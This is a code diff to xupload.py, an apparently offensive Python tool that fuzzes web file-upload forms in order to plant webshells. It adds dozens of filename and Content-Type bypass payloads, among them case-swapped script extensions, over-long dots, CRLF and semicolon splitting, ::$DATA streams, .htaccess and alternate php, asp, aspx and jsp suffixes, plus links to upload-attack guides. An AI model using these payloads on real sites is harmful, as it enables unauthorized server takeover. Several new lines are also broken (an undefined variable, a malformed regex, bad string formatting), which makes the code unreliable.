@@ -49,6 +49,29 @@ def get_form_data_post_info(url, cookie):
     return_value['origin_html'] = origin_html
     return return_value
 
+def post_multipart_form_data2(packet):
+    headers={}
+    code = 0
+    html = ''
+    return_value = {'code': code, 'html': html}
+    header_list = re.findall(r"([^:\s]+): ([^\r\n]+)((\n)|(\r\n))", packet)
+    for each in header_list:
+        headers[each[0]] = each[1]
+    data = re.search(r"((\r\n\r\n)|(\n\n))(.*)", packet).group(4)
+    proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
+    opener = urllib.request.build_opener(proxy)
+    urllib.request.install_opener(opener)
+    req = urllib.request.Request(
+        url, headers=headers, data=unicode_to_bytes(data))
+    with urllib.request.urlopen(req) as response:
+        code = response.code
+        html = response.read()
+        encoding = chardet.detect(html)['encoding']
+        html = html.decode(encoding=encoding)
+    return_value['code'] = code
+    return_value['html'] = html
+    return return_value
+
 
 def post_multipart_form_data(url, cookie, form_data_dict, boundary, form_file_param_name='', file_content='', filename='', content_type=''):
     # form_file_param_name为表单中的文件参数名
@@ -138,7 +161,7 @@ def check_upload_succeed(rsp, origin_html):
     lines = re.findall(r"([^\r\n]+)", html)
     for line in lines:
         if not re.match(r"^\s+$", line) and line not in origin_html:
-            result = re.search(r"([^\s<>]+\.%s)" % script_suffix, line, re.I)
+            result = re.search(r"([^\s<>]+\.((?!=jpg|jpeg|gif|png)[a-zA-Z0-9])+" , line, re.I)
             if result:
                 result = result.group(1)
                 print(result)
@@ -169,8 +192,20 @@ def fuzz_upload_webshell():
     fuzz_file_name = [
         {'desc': '修改后缀为webshell后缀',
             'modify': {'filename': 'test.%s' % script_suffix}},
-        {'desc': '修改后缀为正常后缀接";test.php",eg:"test.jpg;test.php"',
+        {'desc': '修改后缀为非标准大小写webshell后缀',
+            'modify': {'filename': 'test.%s' % script_suffix.replace(script_suffix[1],script_suffix[1].upper())}},
+        {'desc': '上传如test..............(超长点).%s' % script_suffix,
+            'modify': {'filename': 'test%s%s' % ('.'*1030,script_suffix)}},
+        {'desc': '上传文件名为如test.php......的文件',
+            'modify': {'filename': 'test.%s......' % script_suffix}},
+        {'desc': '上传test.%s;test.%s"' % (work_suffix,script_suffix),
             'modify': {'filename': 'test.%s;test.%s' % (work_suffix, script_suffix)}},
+        {'desc': '上传test.%s;test.%s"' % (script_suffix,work_suffix),
+            'modify': {'filename': 'test.%s;test.%s' % (script_suffix, work_suffix)}},
+        {'desc': '上传test.%s;%s.%s"' % (script_suffix, '王'*500,work_suffix),
+            'modify': {'filename': 'test.%s;%s.%s' % (script_suffix, '王'*500, work_suffix)}},
+        {'desc': '上传test.%s"' % script_suffix[:-1]+'\r\n'+script_suffix[-1],
+            'modify': {'filename': 'test.%s' % script_suffix[:-1]+'\x0d\x0a'+script_suffix[-1]}},
         {'desc': '两个filename参数且前正常文件后webshell', 'modify': {
             'filename': 'test.%s"; filename="test.%s' % (work_suffix, script_suffix)}},
         {'desc': '两个filename参数且前webshell后正常文件', 'modify': {
@@ -188,6 +223,8 @@ def fuzz_upload_webshell():
         {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type修改为正常文件的content-type',
             'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
                 script_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
+        {'desc': '上传后缀为如.php::$DATA的文件','modify':{'filename': 'test.%s::$DATA' % script_suffix}},
+        {'desc': '上传后缀为如.php::$DATA......的文件','modify':{'filename': 'test.%s::$DATA......' % script_suffix}},
 
     ]
     for i in range(0, 256):
@@ -201,9 +238,57 @@ def fuzz_upload_webshell():
             'filename': 'test.%s";%sfilename="test.%s' % (script_suffix, chr(i), work_suffix)}}
         fuzz_file_name.append(item)
     if script_suffix == "php":
-        item = {'desc': '上传.htaccess,只适用于php',
-                'modify': {'filename': '.htaccess'}}
-        fuzz_file_name.append(item)
+        fuzz_file_name.append({'desc': '上传.htaccess,只适用于php','modify': {'filename': '.htaccess'}})
+        fuzz_file_name.append({'desc': '上传.htaccess,只适用于php','modify': {'filename': '.hTaccess'}})
+        fuzz_file_name.append({'desc': '上传.php3,只适用于php','modify': {'filename': 'test.php3'}})
+        fuzz_file_name.append({'desc': '上传.php3,只适用于php','modify': {'filename': 'test.pHp3'}})
+        fuzz_file_name.append({'desc': '上传.php4,只适用于php','modify': {'filename': 'test.php4'}})
+        fuzz_file_name.append({'desc': '上传.php4,只适用于php','modify': {'filename': 'test.pHp4'}})
+        fuzz_file_name.append({'desc': '上传.php5,只适用于php','modify': {'filename': 'test.php5'}})
+        fuzz_file_name.append({'desc': '上传.php5,只适用于php','modify': {'filename': 'test.pHp5'}})
+        fuzz_file_name.append({'desc': '上传.phtm,只适用于php','modify': {'filename': 'test.phtm'}})
+        fuzz_file_name.append({'desc': '上传.pHtm,只适用于php','modify': {'filename': 'test.pHtm'}})
+        fuzz_file_name.append({'desc': '上传.phtml,只适用于php','modify': {'filename': 'test.phtml'}})
+        fuzz_file_name.append({'desc': '上传.phtml,只适用于php','modify': {'filename': 'test.pHtml'}})
+        fuzz_file_name.append({'desc': '上传.pht,只适用于php','modify': {'filename': 'test.pht'}})
+        fuzz_file_name.append({'desc': '上传.pht,只适用于php','modify': {'filename': 'test.pHt'}})
+        fuzz_file_name.append({'desc': '上传.phps,只适用于php','modify': {'filename': 'test.phps'}})
+        fuzz_file_name.append({'desc': '上传.phps,只适用于php','modify': {'filename': 'test.pHps'}})
+        fuzz_file_name.append({'desc': '上传.php.pjpg,只适用于php','modify': {'filename': 'test.pjpg'}})
+        fuzz_file_name.append({'desc': '上传.php.pjpg,只适用于php','modify': {'filename': 'test.pJpg'}})
+        fuzz_file_name.append({'desc': '上传.html,只适用于php','modify': {'filename': 'test.html'}})
+        fuzz_file_name.append({'desc': '上传.html,只适用于php','modify': {'filename': 'test.hTml'}})
+        fuzz_file_name.append({'desc': '上传.inc,只适用于php','modify': {'filename': 'test.inc'}})
+        fuzz_file_name.append({'desc': '上传.inc,只适用于php','modify': {'filename': 'test.iNc'}})
+        fuzz_file_name.append({'desc': '上传.lnk,只适用于php','modify': {'filename': 'test.lnk'}})
+        fuzz_file_name.append({'desc': '上传.lnk,只适用于php','modify': {'filename': 'test.lNk'}})
+    if script_suffix == 'asp':
+        fuzz_file_name.append({'desc': '上传.asa文件,只适用于asp','modify':{'filename':'test.asa'}})
+        fuzz_file_name.append({'desc': '上传.aSa文件,只适用于asp','modify':{'filename':'test.aSa'}})
+        fuzz_file_name.append({'desc': '上传.asa;test.%s文件,只适用于asp' % work_suffix,'modify':{'filename':'test.asa;test.%s' % work_suffix}})
+        fuzz_file_name.append({'desc': '上传.aSa;test.%s文件,只适用于asp' % work_suffix,'modify':{'filename':'test.aSa;test.%s' % work_suffix}})
+        fuzz_file_name.append({'desc': '上传.cer文件,只适用于asp','modify':{'filename':'test.cer'}})
+        fuzz_file_name.append({'desc': '上传.cEr文件,只适用于asp','modify':{'filename':'test.cEr'}})
+        fuzz_file_name.append({'desc': '上传.cer;test.%s文件,只适用于asp' % work_suffix,'modify':{'filename':'test.cer;test.%s' % work_suffix}})
+        fuzz_file_name.append({'desc': '上传.cEr;test.%s文件,只适用于asp' % work_suffix,'modify':{'filename':'test.cEr;test.%s' % work_suffix}})
+        fuzz_file_name.append({'desc': '上传.cdx文件,只适用于asp','modify':{'filename':'test.cdx'}})
+        fuzz_file_name.append({'desc': '上传.cDx文件,只适用于asp','modify':{'filename':'test.cDx'}})
+        fuzz_file_name.append({'desc': '上传.cdx;test.%s文件,只适用于asp' % work_suffix,'modify':{'filename':'test.cdx;test.%s' % work_suffix}})
+        fuzz_file_name.append({'desc': '上传.cDx;test.%s文件,只适用于asp' % work_suffix,'modify':{'filename':'test.cDx;test.%s' % work_suffix}})
+    if script_suffix=='aspx':
+        fuzz_file_name.append({'desc': '上传.ashx文件,只适用于aspx' % work_suffix,'modify':{'filename':'test.ashx'}})
+        fuzz_file_name.append({'desc': '上传.aShx文件,只适用于aspx' % work_suffix,'modify':{'filename':'test.aShx'}})
+        fuzz_file_name.append({'desc': '上传.ascx文件,只适用于aspx' % work_suffix,'modify':{'filename':'test.ascx'}})
+        fuzz_file_name.append({'desc': '上传.aScx文件,只适用于aspx' % work_suffix,'modify':{'filename':'test.aScx'}})
+        fuzz_file_name.append({'desc': '上传.asax文件,只适用于aspx' % work_suffix,'modify':{'filename':'test.asax'}})
+        fuzz_file_name.append({'desc': '上传.aSax文件,只适用于aspx' % work_suffix,'modify':{'filename':'test.aSax'}})
+        fuzz_file_name.append({'desc': '上传.asmx文件,只适用于aspx' % work_suffix,'modify':{'filename':'test.asmx'}})
+        fuzz_file_name.append({'desc': '上传.aSmx文件,只适用于aspx' % work_suffix,'modify':{'filename':'test.aSmx'}})
+    if script_suffix=='jsp':
+        fuzz_file_name.append({'desc': '上传.jspx文件,只适用于jsp' % work_suffix,'modify':{'filename':'test.jspx'}})
+        fuzz_file_name.append({'desc': '上传.jSpx文件,只适用于jsp' % work_suffix,'modify':{'filename':'test.jSpx'}})
+        fuzz_file_name.append({'desc': '上传.jspf文件,只适用于jsp' % work_suffix,'modify':{'filename':'test.jspf'}})
+        fuzz_file_name.append({'desc': '上传.jSpf文件,只适用于jsp' % work_suffix,'modify':{'filename':'test.jSpf'}})
 
     fuzz_content_type = [
         {'desc': '修改content-type为image/jpeg',
@@ -227,6 +312,7 @@ def fuzz_upload_webshell():
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type修改为正常文件的content-type',
             'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
                 webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
+            {'desc': 'filename字段放在content-type后面','modify':{'content_type':work_content_type+'\r\nfilename="test.%s"' % script_suffix}}
     ]
     for each in CONTENT_TYPE_LIST:
         item = {'desc': '修改content-type为%s' % each,
@@ -264,7 +350,7 @@ def fuzz_upload_webshell():
 
 
 parser = argparse.ArgumentParser(
-    description="xupload.py is a program that automates the testing of uploading functionality. If xupload.py does not successfully upload webshell, try out more tips on this link: http://3xp10it.cc/web/2016/08/12/fckeditor各版本绕过/")
+        description="xupload.py is a program that automates the testing of uploading functionality. If xupload.py does not successfully upload webshell, try more tips at:\n1.http://3xp10it.cc/web/2016/08/12/fckeditor各版本绕过/\n2.https://paper.seebug.org/219/\n3.http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf\n4.https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/")
 parser.add_argument(
     "-u", "--url", required=True, help="The target url which has upload function")
 parser.add_argument(
